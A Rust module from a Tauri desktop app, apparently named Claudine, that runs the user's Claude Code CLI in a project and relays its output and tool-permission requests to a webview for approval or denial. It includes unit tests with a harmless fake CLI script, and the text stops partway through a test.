//! Runs the user's own `claude` CLI in the open project, and relays what it says.
//!
//! `claude` talks JSON lines over stdin and stdout (`--input-format stream-json
//! --output-format stream-json`). With `--permission-prompt-tool stdio`, every tool call
//! that needs permission arrives here as a `can_use_tool` request and waits for an answer.
//! The webview only says allow or deny for a request id. The input that then runs is the
//! copy Rust kept, so the webview can't change what was approved.

use crate::accounts::{AccountsState, use_account};
use crate::error::CommandError;
use crate::project::ProjectState;
use crate::trust::TrustState;
use serde::{Deserialize, Serialize};
// LEARN: `Value` is untyped JSON, like `unknown` after `JSON.parse`; `json!` builds one.
use serde_json::{Value, json};
use std::collections::HashMap;
use std::io::{self, BufRead, BufReader, Read, Write};
use std::path::{Component, Path, PathBuf};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use tauri::ipc::Channel;
use tauri::{AppHandle, State};
use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};

/// The longest message the composer may send.
const MAX_MESSAGE_BYTES: usize = 100_000;
/// Tool details and results longer than this are cut before reaching the webview.
const MAX_SHOWN_CHARS: usize = 4_000;
/// How much of `claude`'s stderr is kept to explain an unexpected exit.
const STDERR_TAIL_BYTES: usize = 4_000;
const DECLINED: &str = "The user declined this in Claudine.";
/// More models than this in `claude`'s list are ignored.
const MAX_MODELS: usize = 30;

/// What the webview hears about a session, already summarized by Rust.
///
/// File paths inside the project are shown relative to it. A path outside the project
/// is shown in full with `outside: true`, because that's exactly what the user must see
/// before approving. `outside` is a lexical hint for the UI, not a security check.
#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(
    tag = "kind",
    rename_all = "camelCase",
    rename_all_fields = "camelCase"
)]
pub enum SessionEvent {
    Ready {
        model: String,
        /// Claude Code's id for the conversation, which `--resume` takes.
        session_id: String,
    },
    Text {
        text: String,
    },
    Tool {
        id: String,
        name: String,
        summary: String,
        outside: bool,
    },
    ToolResult {
        id: String,
        is_error: bool,
        text: String,
    },
    Permission {
        id: String,
        tool: String,
        summary: String,
        detail: String,
        outside: bool,
    },
    /// `claude` withdrew a permission request, for example after an interrupt.
    PermissionClosed {
        id: String,
    },
    TurnDone {
        is_error: bool,
        message: Option<String>,
        cost_usd: Option<f64>,
        /// How many model turns the session has taken so far.
        num_turns: Option<u64>,
    },
    /// Claude's todo list, from its `TodoWrite` tool.
    Plan {
        items: Vec<PlanItem>,
    },
    /// Claude read a message the user sent, with `--replay-user-messages`.
    UserEcho {
        text: String,
    },
    /// The account's usage status. `rejected` means it hit a usage limit.
    RateLimit {
        status: String,
        resets_at: Option<u64>,
    },
    /// What `claude` offers, from its answer to `initialize`. Arrives before any message.
    Options {
        models: Vec<ModelOption>,
        mode: String,
    },
    /// The permission mode changed, from Claudine or from `claude` leaving plan mode.
    Mode {
        mode: String,
    },
    /// The model changed. `model` is the full id, such as `claude-sonnet-5-5`.
    Model {
        model: String,
    },
    /// `claude` refused a request from Claudine.
    Notice {
        message: String,
    },
    /// `stderr` is the end of `claude`'s error output, to explain a failed start.
    Exited {
        code: Option<i32>,
        stderr: String,
    },
}

/// One step of Claude's plan.
#[derive(Clone, Debug, Deserialize, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PlanItem {
    pub text: String,
    /// `pending`, `in_progress` or `completed`, as Claude Code says.
    pub status: String,
}

/// Where a session's events go: the Editor chat's channel, or a run's recorder.
// LEARN: `dyn Fn` is a trait object: any closure with this signature, chosen at runtime.
pub type EventSink = Arc<dyn Fn(SessionEvent) + Send + Sync>;

/// How to start `claude`, beyond the account and folder.
pub struct SpawnOptions {
    /// One of `claude`'s permission modes, chosen by Rust, never by the webview.
    pub mode: &'static str,
    /// A Claude Code session id to continue.
    pub resume: Option<String>,
    /// Extra settings JSON, for the run's `ask` rules.
    pub settings: Option<String>,
    /// Tools allowed without asking, for versions without auto mode.
    pub allowed_tools: Vec<String>,
    /// Echo each user message when Claude reads it, for queued mid-run messages.
    pub replay: bool,
    /// Added to Claude Code's system prompt, to tell a run where it works.
    pub append_prompt: Option<String>,
}

impl SpawnOptions {
    /// The Editor chat: the default mode, nothing extra.
    fn editor() -> SpawnOptions {
        SpawnOptions {
            mode: "default",
            resume: None,
            settings: None,
            allowed_tools: Vec::new(),
            replay: false,
            append_prompt: None,
        }
    }
}

/// One entry of `claude`'s model list. `value` is what `set_model` takes.
#[derive(Clone, Debug, PartialEq, Serialize)]
pub struct ModelOption {
    value: String,
    name: String,
    description: String,
}

/// The modes Claudine offers. `bypassPermissions`, `auto` and `dontAsk` are left out:
/// the first two let `claude` approve tools itself, without asking Claudine.
#[derive(Clone, Copy, Debug, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub enum PermissionMode {
    Default,
    AcceptEdits,
    Plan,
}

impl PermissionMode {
    fn as_str(self) -> &'static str {
        match self {
            PermissionMode::Default => "default",
            PermissionMode::AcceptEdits => "acceptEdits",
            PermissionMode::Plan => "plan",
        }
    }
}

/// The pieces of a running session that commands and the reader thread share.
#[derive(Clone)]
struct Handles {
    stdin: Arc<Mutex<ChildStdin>>,
    /// Open permission requests: `claude`'s request id to the tool input it asked about.
    // LEARN: `HashMap` is `Map`; keys and values each have one type, fixed at compile time.
    pending: Arc<Mutex<HashMap<String, Value>>>,
    /// The model values `claude` listed, the only ones `set_model` passes on.
    models: Arc<Mutex<Vec<String>>>,
}

pub struct Session {
    /// The account it runs on, so signing that account out can stop it.
    account: String,
    child: Arc<Mutex<Child>>,
    handles: Handles,
    next_request: AtomicU64,
}

impl Session {
    /// Sends a user message. Claude reads it at its next step if it's busy.
    pub fn send_user(&self, text: &str) -> Result<(), CommandError> {
        if text.len() > MAX_MESSAGE_BYTES {
            return Err(CommandError::TooLarge);
        }
        write_line(
            &self.handles.stdin,
            &json!({ "type": "user", "message": { "role": "user", "content": text } }),
        )
    }

    /// Answers one permission request with the input Rust kept.
    pub fn answer(&self, id: &str, allow: bool) -> Result<(), CommandError> {
        answer(&self.handles, id, allow)
    }

    /// Sends Claudine's own control request. `kind` goes in the id, to match the answer.
    pub fn control(&self, kind: &str, request: Value) -> Result<(), CommandError> {
        let number = self.next_request.fetch_add(1, Ordering::Relaxed);
        write_line(
            &self.handles.stdin,
            &json!({
                "type": "control_request",
                "request_id": format!("claudine-{kind}-{number}"),
                "request": request
            }),
        )
    }

    /// Stops the current turn, like Esc in the terminal. The process keeps running.
    pub fn interrupt(&self) -> Result<(), CommandError> {
        self.control("interrupt", json!({ "subtype": "interrupt" }))
    }
}

impl Drop for Session {
    /// Ending a session ends its process, so no `claude` outlives its project or the app.
    fn drop(&mut self) {
        if let Ok(mut child) = self.child.lock() {
            let _ = child.kill();
            let _ = child.wait();
        }
    }
}

/// The session for the open project, if one is running. One at a time for now.
#[derive(Default)]
pub struct SessionState(Mutex<Option<Session>>);

impl SessionState {
    /// Ends the current session, if any.
    pub fn stop(&self) {
        if let Ok(mut current) = self.0.lock() {
            // Dropping the `Session` runs its `Drop`, which kills the process.
            *current = None;
        }
    }

    /// Ends the current session if it runs on `account`.
    pub fn stop_account(&self, account: &str) {
        if let Ok(mut current) = self.0.lock()
            && current.as_ref().is_some_and(|s| s.account == account)
        {
            *current = None;
        }
    }

    /// Copies of the shared handles, so the session lock isn't held while writing.
    fn handles(&self) -> Result<Handles, CommandError> {
        let current = self.0.lock().map_err(|_| CommandError::Internal)?;
        match current.as_ref() {
            // LEARN: cloning an `Arc` copies the pointer and bumps a count; the data is shared.
            Some(session) => Ok(session.handles.clone()),
            None => Err(CommandError::NoSession),
        }
    }
}

/// Looks for the user's own install. Never downloads or installs anything.
///
/// `PATH` comes first, so the app runs the same `claude` as the user's terminal. Apps
/// started from the Dock get a minimal `PATH`, so the usual install folders follow.
/// Relative `PATH` entries are skipped: `.` would let a project supply its own `claude`.
pub fn find_claude() -> Option<PathBuf> {
    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(path) = std::env::var_os("PATH") {
        for folder in std::env::split_paths(&path).filter(|folder| folder.is_absolute()) {
            candidates.push(folder.join("claude"));
        }
    }
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        candidates.push(home.join(".local/bin/claude"));
        candidates.push(home.join(".claude/local/claude"));
    }
    candidates.push(PathBuf::from("/opt/homebrew/bin/claude"));
    candidates.push(PathBuf::from("/usr/local/bin/claude"));
    candidates.into_iter().find(|path| is_executable(path))
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|meta| meta.is_file() && meta.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(path: &Path) -> bool {
    path.is_file()
}

/// A failed spawn: `NotFound` means `claude` itself is gone.
pub fn spawn_error(error: io::Error) -> CommandError {
    match error.kind() {
        io::ErrorKind::NotFound => CommandError::ClaudeNotFound,
        other => CommandError::from(other),
    }
}

/// `config_dir` is the account's config folder, or `None` for the default account.
pub fn spawn_session(
    claude: &Path,
    folder: &Path,
    account: &str,
    config_dir: Option<&Path>,
    options: &SpawnOptions,
    on_event: EventSink,
) -> Result<Session, CommandError> {
    // LEARN: `Command` is `child_process.spawn`; `Stdio::piped()` hands us each stream.
    let mut command = Command::new(claude);
    command.args([
        "-p",
        "--input-format",
        "stream-json",
        "--output-format",
        "stream-json",
        "--verbose",
        "--permission-prompt-tool",
        "stdio",
        // Explicit, so a "bypass permissions" default in the user's settings doesn't apply.
        "--permission-mode",
        options.mode,
    ]);
    if let Some(id) = &options.resume {
        command.args(["--resume", id]);
    }
    if let Some(settings) = &options.settings {
        command.args(["--settings", settings]);
    }
    if !options.allowed_tools.is_empty() {
        command.arg("--allowed-tools").args(&options.allowed_tools);
    }
    if options.replay {
        command.arg("--replay-user-messages");
    }
    if let Some(prompt) = &options.append_prompt {
        command.args(["--append-system-prompt", prompt]);
    }
    command
        .current_dir(folder)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    use_account(&mut command, config_dir);
    let mut child = command.spawn().map_err(spawn_error)?;

    // `take` moves each pipe out of `child`, leaving `None`; it's always there after `piped()`.
    let (Some(stdin), Some(stdout), Some(stderr)) =
        (child.stdin.take(), child.stdout.take(), child.stderr.take())
    else {
        let _ = child.kill();
        return Err(CommandError::Internal);
    };

    let handles = Handles {
        stdin: Arc::new(Mutex::new(stdin)),
        pending: Arc::new(Mutex::new(HashMap::new())),
        models: Arc::new(Mutex::new(Vec::new())),
    };
    let child = Arc::new(Mutex::new(child));
    let stderr_tail = Arc::new(Mutex::new(String::new()));

    let tail = Arc::clone(&stderr_tail);
    thread::spawn(move || keep_tail(stderr, &tail));

    let relay = Relay {
        handles: handles.clone(),
        root: folder.to_path_buf(),
        on_event,
    };
    let reader_child = Arc::clone(&child);
    thread::spawn(move || {
        relay.run(stdout);
        let code = wait_for_exit(&reader_child);
        let stderr = stderr_tail.lock().map(|t| t.clone()).unwrap_or_default();
        (relay.on_event)(SessionEvent::Exited { code, stderr });
    });

    write_line(
        &handles.stdin,
        &json!({
            "type": "control_request",
            "request_id": "claudine-init",
            "request": { "subtype": "initialize" }
        }),
    )?;

    Ok(Session {
        account: account.to_string(),
        child,
        handles,
        next_request: AtomicU64::new(1),
    })
}

/// Reads `stderr` until it closes, keeping only its last few thousand bytes.
pub fn keep_tail(stderr: impl Read, tail: &Mutex<String>) {
    for line in BufReader::new(stderr).lines() {
        let Ok(line) = line else { break };
        let Ok(mut tail) = tail.lock() else { break };
        tail.push_str(&line);
        tail.push('\n');
        if tail.len() > STDERR_TAIL_BYTES {
            let mut cut = tail.len() - STDERR_TAIL_BYTES;
            while !tail.is_char_boundary(cut) {
                cut += 1;
            }
            tail.drain(..cut);
        }
    }
}

/// Polls instead of blocking in `wait`, so `Drop` can still take the lock to kill it.
pub fn wait_for_exit(child: &Mutex<Child>) -> Option<i32> {
    for _ in 0..40 {
        let Ok(mut child) = child.lock() else {
            return None;
        };
        match child.try_wait() {
            Ok(Some(status)) => return status.code(),
            Ok(None) => {}
            // Already reaped by `Drop`.
            Err(_) => return None,
        }
        drop(child);
        thread::sleep(Duration::from_millis(50));
    }
    None
}

/// Sends one JSON message to `claude`.
fn write_line(stdin: &Mutex<ChildStdin>, message: &Value) -> Result<(), CommandError> {
    let mut line = message.to_string();
    line.push('\n');
    let mut stdin = stdin.lock().map_err(|_| CommandError::Internal)?;
    stdin
        .write_all(line.as_bytes())
        .and_then(|()| stdin.flush())
        .map_err(|error| match error.kind() {
            // The process has exited.
            io::ErrorKind::BrokenPipe => CommandError::NoSession,
            other => CommandError::from(other),
        })
}

/// The reader thread's view of the session.
struct Relay {
    handles: Handles,
    root: PathBuf,
    on_event: EventSink,
}

impl Relay {
    /// Handles each line `claude` prints until it closes stdout.
    fn run(&self, stdout: impl Read) {
        for line in BufReader::new(stdout).lines() {
            let Ok(line) = line else { break };
            let Ok(message) = serde_json::from_str::<Value>(&line) else {
                continue;
            };
            for event in self.handle(&message) {
                (self.on_event)(event);
            }
        }
    }

    fn handle(&self, message: &Value) -> Vec<SessionEvent> {
        // LEARN: indexing a missing key gives `Value::Null` instead of panicking.
        let id = message["request_id"].as_str().unwrap_or("").to_string();
        match message["type"].as_str() {
            Some("control_request") => {
                let request = &message["request"];
                if request["subtype"] == "can_use_tool" {
                    let tool = request["tool_name"].as_str().unwrap_or("").to_string();
                    let input = request["input"].clone();
                    let described = describe(&tool, &input, &self.root);
                    if let Ok(mut pending) = self.handles.pending.lock() {
                        pending.insert(id.clone(), input);
                    }
                    vec![SessionEvent::Permission {
                        id,
                        tool,
                        summary: described.summary,
                        detail: described.detail,
                        outside: described.outside,
                    }]
                } else {
                    // Hook callbacks, MCP messages and the like: refuse rather than hang.
                    let _ = write_line(
                        &self.handles.stdin,
                        &json!({
                            "type": "control_response",
                            "response": {
                                "subtype": "error",
                                "request_id": id,
                                "error": "Not supported by Claudine"
                            }
                        }),
                    );
                    Vec::new()
                }
            }
            Some("control_response") => self.control_response(&message["response"]),
            Some("control_cancel_request") => {
                if let Ok(mut pending) = self.handles.pending.lock() {
                    pending.remove(&id);
                }
                vec![SessionEvent::PermissionClosed { id }]
            }
            _ => events_for(message, &self.root),
        }
    }
}

impl Relay {
    /// `claude`'s answers to Claudine's own requests: `initialize`, mode and model.
    fn control_response(&self, response: &Value) -> Vec<SessionEvent> {
        let id = response["request_id"].as_str().unwrap_or("");
        if !id.starts_with("claudine-") {
            return Vec::new();
        }
        if response["subtype"] == "error" {
            let message = response["error"]
                .as_str()
                .unwrap_or("Claude Code refused that.");
            return vec![SessionEvent::Notice {
                message: shorten(message.to_string()),
            }];
        }
        let body = &response["response"];
        if id == "claudine-init" {
            let models = model_options(body);
            if let Ok(mut known) = self.handles.models.lock() {
                *known = models.iter().map(|m| m.value.clone()).collect();
            }
            let mode = body["current_permission_mode"]
                .as_str()
                .unwrap_or("default");
            return vec![SessionEvent::Options {
                models,
                mode: mode.to_string(),
            }];
        }
        match body["model"].as_str() {
            Some(model) if id.starts_with("claudine-model-") => vec![SessionEvent::Model {
                model: model.to_string(),
            }],
            _ => Vec::new(),
        }
    }
}

/// The model list from `initialize`'s answer. Older versions don't send one.
fn model_options(body: &Value) -> Vec<ModelOption> {
    let Some(list) = body["models"].as_array() else {
        return Vec::new();
    };
    list.iter()
        .filter_map(|model| {
            let value = model["value"].as_str()?;
            if value.is_empty() || value.len() > 100 {
                return None;
            }
            let text = |key: &str| shorten(model[key].as_str().unwrap_or("").to_string());
            Some(ModelOption {
                value: value.to_string(),
                name: Some(text("displayName"))
                    .filter(|name| !name.is_empty())
                    .unwrap_or_else(|| value.to_string()),
                description: text("description"),
            })
        })
        .take(MAX_MODELS)
        .collect()
}

/// Turns one of `claude`'s output messages into events. Unknown messages give none.
fn events_for(message: &Value, root: &Path) -> Vec<SessionEvent> {
    let mut events = Vec::new();
    match message["type"].as_str() {
        Some("system") if message["subtype"] == "init" => {
            let model = message["model"].as_str().unwrap_or("").to_string();
            let session_id = message["session_id"].as_str().unwrap_or("").to_string();
            events.push(SessionEvent::Ready { model, session_id });
        }
        Some("rate_limit_event") => {
            let info = &message["rate_limit_info"];
            if let Some(status) = info["status"].as_str() {
                events.push(SessionEvent::RateLimit {
                    status: shorten(status.to_string()),
                    resets_at: info["resetsAt"].as_u64(),
                });
            }
        }
        Some("system") if message["subtype"] == "status" => {
            if let Some(mode) = message["permissionMode"].as_str() {
                events.push(SessionEvent::Mode {
                    mode: mode.to_string(),
                });
            }
        }
        Some("assistant") => {
            for block in blocks(message) {
                match block["type"].as_str() {
                    Some("text") => {
                        let text = block["text"].as_str().unwrap_or("").to_string();
                        if !text.is_empty() {
                            events.push(SessionEvent::Text { text });
                        }
                    }
                    Some("tool_use") => {
                        let name = block["name"].as_str().unwrap_or("").to_string();
                        if name == "TodoWrite" {
                            events.push(SessionEvent::Plan {
                                items: plan_items(&block["input"]),
                            });
                        }
                        let described = describe(&name, &block["input"], root);
                        events.push(SessionEvent::Tool {
                            id: block["id"].as_str().unwrap_or("").to_string(),
                            name,
                            summary: described.summary,
                            outside: described.outside,
                        });
                    }
                    _ => {}
                }
            }
        }
        Some("user") => {
            // A message the user sent, echoed back when Claude read it.
            if let Some(text) = message["message"]["content"].as_str() {
                events.push(SessionEvent::UserEcho {
                    text: shorten(text.to_string()),
                });
            }
            for block in blocks(message) {
                if block["type"] == "text" {
                    let text = block["text"].as_str().unwrap_or("").to_string();
                    events.push(SessionEvent::UserEcho {
                        text: shorten(text),
                    });
                }
                if block["type"] == "tool_result" {
                    events.push(SessionEvent::ToolResult {
                        id: block["tool_use_id"].as_str().unwrap_or("").to_string(),
                        is_error: block["is_error"].as_bool().unwrap_or(false),
                        text: shorten(result_text(&block["content"])),
                    });
                }
            }
        }
        Some("result") => {
            let is_error = message["is_error"].as_bool().unwrap_or(false);
            let message_text = if is_error {
                message["result"]
                    .as_str()
                    .map(|text| shorten(text.to_string()))
            } else {
                None
            };
            events.push(SessionEvent::TurnDone {
                is_error,
                message: message_text,
                cost_usd: message["total_cost_usd"].as_f64(),
                num_turns: message["num_turns"].as_u64(),
            });
        }
        _ => {}
    }
    events
}

/// Claude's todo list from a `TodoWrite` input, at most 50 steps.
fn plan_items(input: &Value) -> Vec<PlanItem> {
    let Some(todos) = input["todos"].as_array() else {
        return Vec::new();
    };
    todos
        .iter()
        .filter_map(|todo| {
            let text = todo["content"].as_str()?;
            Some(PlanItem {
                text: shorten(text.to_string()),
                status: todo["status"].as_str().unwrap_or("pending").to_string(),
            })
        })
        .take(50)
        .collect()
}

/// The content blocks of an `assistant` or `user` message. A plain string has none.
fn blocks(message: &Value) -> &[Value] {
    message["message"]["content"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or(&[])
}

/// A tool result's content is either a string or a list of `{ "type": "text" }` parts.
fn result_text(content: &Value) -> String {
    match content {
        Value::String(text) => text.clone(),
        Value::Array(parts) => parts
            .iter()
            .filter_map(|part| part["text"].as_str())
            .collect::<Vec<_>>()
            .join("\n"),
        _ => String::new(),
    }
}

struct Described {
    summary: String,
    detail: String,
    outside: bool,
}

/// What to show for a tool call: a one-line summary and the details worth checking.
fn describe(tool: &str, input: &Value, root: &Path) -> Described {
    let text = |key: &str| input[key].as_str().unwrap_or("").to_string();
    let (summary, detail, outside) = match tool {
        "Read" | "Write" | "Edit" | "NotebookEdit" => {
            let key = if tool == "NotebookEdit" {
                "notebook_path"
            } else {
                "file_path"
            };
            let (path, outside) = relative(&text(key), root);
            let detail = match tool {
                "Write" => text("content"),
                "Edit" => format!(
                    "{}\n{}",
                    prefix_lines("- ", &text("old_string")),
                    prefix_lines("+ ", &text("new_string"))
                ),
                "NotebookEdit" => text("new_source"),
                _ => String::new(),
            };
            (path, detail, outside)
        }
        "Bash" => (text("command"), text("description"), false),
        "Glob" | "Grep" => (text("pattern"), text("path"), false),
        "WebFetch" => (text("url"), text("prompt"), false),
        "WebSearch" => (text("query"), String::new(), false),
        "ExitPlanMode" => ("Leave plan mode and start".to_string(), text("plan"), false),
        _ => (String::new(), input.to_string(), false),
    };
    Described {
        summary: shorten(summary),
        detail: shorten(detail),
        outside,
    }
}

/// `root/src/a.rs` becomes `src/a.rs`. Anything else stays as it is, marked outside.
fn relative(path: &str, root: &Path) -> (String, bool) {
    let path = Path::new(path);
    // `..` is checked because `strip_prefix` compares text: `root/../x` would pass it.
    let climbs = path.components().any(|part| part == Component::ParentDir);
    match path.strip_prefix(root) {
        Ok(inside) if !climbs => {
            let shown = inside.to_string_lossy().into_owned();
            let shown = if shown.is_empty() {
                ".".to_string()
            } else {
                shown
            };
            (shown, false)
        }
        _ => (path.to_string_lossy().into_owned(), true),
    }
}

fn prefix_lines(prefix: &str, text: &str) -> String {
    text.lines()
        .map(|line| format!("{prefix}{line}"))
        .collect::<Vec<_>>()
        .join("\n")
}

/// Cuts text to `MAX_SHOWN_CHARS` characters, never through the middle of one.
fn shorten(text: String) -> String {
    match text.char_indices().nth(MAX_SHOWN_CHARS) {
        Some((cut, _)) => format!("{}…", &text[..cut]),
        None => text,
    }
}

/// Whether this `claude` has auto mode, from the choices its help lists.
pub fn supports_auto_mode(claude: &Path) -> bool {
    let Ok(output) = Command::new(claude)
        .arg("--help")
        .env_remove("CLAUDECODE")
        .stdin(Stdio::null())
        .output()
    else {
        return false;
    };
    let help = String::from_utf8_lossy(&output.stdout);
    help.split("--permission-mode")
        .nth(1)
        .and_then(|rest| rest.split("--").next())
        .is_some_and(|choices| choices.contains("\"auto\""))
}

#[derive(Serialize)]
pub struct ClaudeStatus {
    found: bool,
}

/// Whether Claude Code is installed where Claudine can find it.
#[tauri::command(async)]
pub fn claude_status() -> ClaudeStatus {
    ClaudeStatus {
        found: find_claude().is_some(),
    }
}

/// Starts `claude` in the open project on `account`, replacing any running session.
///
/// The first time for each folder, Rust asks natively whether to trust it. Events then
/// arrive on `on_event` until the process exits.
#[tauri::command(async)]
pub fn start_session(
    app: AppHandle,
    projects: State<'_, ProjectState>,
    trust: State<'_, TrustState>,
    accounts: State<'_, AccountsState>,
    sessions: State<'_, SessionState>,
    account: String,
    on_event: Channel<SessionEvent>,
) -> Result<(), CommandError> {
    // Looked up by id: the webview never names a config folder.
    let config_dir = accounts.config_dir(&account)?;
    let claude = find_claude().ok_or(CommandError::ClaudeNotFound)?;
    let folder = ensure_trusted(&app, &projects, &trust, "Trust and Start")?;

    // Fails only if the webview is gone; there's no one left to tell.
    let sink: EventSink = Arc::new(move |event| {
        let _ = on_event.send(event);
    });
    let session = spawn_session(
        &claude,
        &folder,
        &account,
        config_dir.as_deref(),
        &SpawnOptions::editor(),
        sink,
    )?;
    accounts.set_last_used(&account);
    let mut current = sessions.0.lock().map_err(|_| CommandError::Internal)?;
    // Replacing the old session drops it, which stops its process.
    *current = Some(session);
    Ok(())
}

/// The open project's folder, once the user trusts it. The first time for each folder,
/// Rust asks with a native dialog the webview can't answer.
pub fn ensure_trusted(
    app: &AppHandle,
    projects: &ProjectState,
    trust: &TrustState,
    button: &str,
) -> Result<PathBuf, CommandError> {
    let (name, folder) = projects.name_and_path()?;
    if !trust.is_trusted(&folder) {
        let message = format!(
            "Claude Code will run in:\n{}\n\nA project can include settings, hooks and MCP \
             servers (in .claude/ and .mcp.json) that run commands on this Mac as soon as \
             Claude starts. Only trust folders whose contents you trust.",
            folder.display()
        );
        let trusted = app
            .dialog()
            .message(message)
            .title(format!("Trust “{name}”?"))
            .kind(MessageDialogKind::Warning)
            .buttons(MessageDialogButtons::OkCancelCustom(
                button.to_string(),
                "Cancel".to_string(),
            ))
            .blocking_show();
        if !trusted {
            return Err(CommandError::NotTrusted);
        }
        // The dialog can stay open while the user opens another folder.
        if projects.name_and_path()?.1 != folder {
            return Err(CommandError::NoProject);
        }
        trust.trust(&folder)?;
    }
    Ok(folder)
}

#[tauri::command(async)]
pub fn send_message(sessions: State<'_, SessionState>, text: String) -> Result<(), CommandError> {
    if text.len() > MAX_MESSAGE_BYTES {
        return Err(CommandError::TooLarge);
    }
    if text.trim().is_empty() {
        return Ok(());
    }
    let handles = sessions.handles()?;
    write_line(
        &handles.stdin,
        &json!({ "type": "user", "message": { "role": "user", "content": text } }),
    )
}

/// Answers one permission request. Each request can be answered once.
#[tauri::command(async)]
pub fn answer_permission(
    sessions: State<'_, SessionState>,
    id: String,
    allow: bool,
) -> Result<(), CommandError> {
    answer(&sessions.handles()?, &id, allow)
}

fn answer(handles: &Handles, id: &str, allow: bool) -> Result<(), CommandError> {
    let input = {
        let mut pending = handles.pending.lock().map_err(|_| CommandError::Internal)?;
        pending.remove(id).ok_or(CommandError::NotFound)?
    };
    let decision = if allow {
        // The input Rust kept, never one from the webview.
        json!({ "behavior": "allow", "updatedInput": input })
    } else {
        json!({ "behavior": "deny", "message": DECLINED })
    };
    write_line(
        &handles.stdin,
        &json!({
            "type": "control_response",
            "response": { "subtype": "success", "request_id": id, "response": decision }
        }),
    )
}

/// Sends Claudine's own control request. `kind` goes in the id, to match the answer.
fn send_control(sessions: &SessionState, kind: &str, request: Value) -> Result<(), CommandError> {
    let current = sessions.0.lock().map_err(|_| CommandError::Internal)?;
    current
        .as_ref()
        .ok_or(CommandError::NoSession)?
        .control(kind, request)
}

/// Stops the current turn, like pressing Esc in the terminal. The session stays open.
#[tauri::command(async)]
pub fn interrupt_session(sessions: State<'_, SessionState>) -> Result<(), CommandError> {
    send_control(&sessions, "interrupt", json!({ "subtype": "interrupt" }))
}

/// Switches the permission mode. Serde refuses any mode not in `PermissionMode`.
#[tauri::command(async)]
pub fn set_mode(
    sessions: State<'_, SessionState>,
    mode: PermissionMode,
) -> Result<(), CommandError> {
    send_control(
        &sessions,
        "mode",
        json!({ "subtype": "set_permission_mode", "mode": mode.as_str() }),
    )
}

/// Switches the model, to one of those `claude` listed.
#[tauri::command(async)]
pub fn set_model(sessions: State<'_, SessionState>, model: String) -> Result<(), CommandError> {
    check_model(&sessions.handles()?, &model)?;
    send_control(
        &sessions,
        "model",
        json!({ "subtype": "set_model", "model": model }),
    )
}

fn check_model(handles: &Handles, model: &str) -> Result<(), CommandError> {
    let known = handles.models.lock().map_err(|_| CommandError::Internal)?;
    if known.iter().any(|m| m == model) {
        Ok(())
    } else {
        Err(CommandError::InvalidInput)
    }
}

#[tauri::command]
pub fn stop_session(sessions: State<'_, SessionState>) {
    sessions.stop();
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Instant;

    /// A stand-in for `claude`: asks to write a file, then saves the answer it gets.
    const FAKE_CLAUDE: &str = r#"#!/bin/sh
read init
printf '%s\n' "$init" > init.json
echo '{"type":"control_request","request_id":"p1","request":{"subtype":"can_use_tool","tool_name":"Write","input":{"file_path":"'"$PWD"'/a.txt","content":"original"}}}'
read answer
printf '%s\n' "$answer" > answer.json
"#;

    /// Runs the fake in a fresh folder. Returns the session, the folder, and the events.
    fn start_fake(name: &str) -> (Session, PathBuf, Arc<Mutex<Vec<String>>>) {
        use std::os::unix::fs::PermissionsExt;
        let folder = std::env::temp_dir().join(format!("claude-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&folder);
        std::fs::create_dir_all(&folder).unwrap();
        let folder = folder.canonicalize().unwrap();
        let fake = folder.join("fake-claude");
        std::fs::write(&fake, FAKE_CLAUDE).unwrap();
        std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();

        let events = Arc::new(Mutex::new(Vec::new()));
        let recorded = Arc::clone(&events);
        let sink: EventSink = Arc::new(move |event| {
            recorded
                .lock()
                .unwrap()
                .push(serde_json::to_string(&event).unwrap());
        });
        let options = SpawnOptions::editor();
        let session = spawn_session(&fake, &folder, "default", None, &options, sink).unwrap();
        (session, folder, events)
    }

    fn wait_for(what: &str, mut done: impl FnMut() -> bool) {
        let start = Instant::now();
        while !done() {
            assert!(
                start.elapsed() < Duration::from_secs(10),
                "timed out: {what}"
            );
            thread::sleep(Duration::from_millis(20));
        }
    }

    fn read_json(path: &Path) -> Value {
        wait_for("answer file", || {
            std::fs::read_to_string(path).is_ok_and(|text| text.ends_with('\n'))
        });
        serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap()
    }

    #[test]
    fn allowing_sends_back_the_input_rust_kept() {
        let (session, folder, events) = start_fake("allow");
        wait_for("permission event", || {
            events
                .lock()
                .unwrap()
                .iter()
                .any(|e| e.contains("permission"))
        });
        let shown: Value = serde_json::from_str(&events.lock().unwrap()[0]).unwrap();
        assert_eq!(shown["kind"], "permission");
        assert_eq!(shown["summary"], "a.txt");
        assert_eq!(shown["detail"], "original");
        assert_eq!(shown["outside"], false);

        answer(&session.handles, "p1", true).unwrap();
        // A second answer to the same request is refused.
        assert_eq!(
            answer(&session.handles, "p1", false),
            Err(CommandError::NotFound)
        );

        let sent = read_json(&folder.join("answer.json"));
        assert_eq!(sent["response"]["request_id"], "p1");
        assert_eq!(sent["response"]["response"]["behavior"], "allow");
        assert_eq!(
            sent["response"]["response"]["updatedInput"]["content"],
            "original"
        );
        let init = read_json(&folder.join("init.json"));
        assert_eq!(init["request"]["subtype"], "initialize");

        wait_for("exit event", || {
            events.lock().unwrap().iter().any(|e| e.contains("exited"))
        });
    }

    #[test]
    fn denying_sends_a_deny_and_unknown_ids_are_refused() {
        let (session, folder, events) = start_fake("deny");
        wait_for("permission event", || {
            events
                .lock()
                .unwrap()
                .iter()
                .any(|e| e.contains("permission"))
        });
        assert_eq!(
            answer(&session.handles, "made-up", true),
            Err(CommandError::NotFound)
        );
        answer(&session.handles, "p1", false).unwrap();

        let sent = read_json(&folder.join("answer.json"));
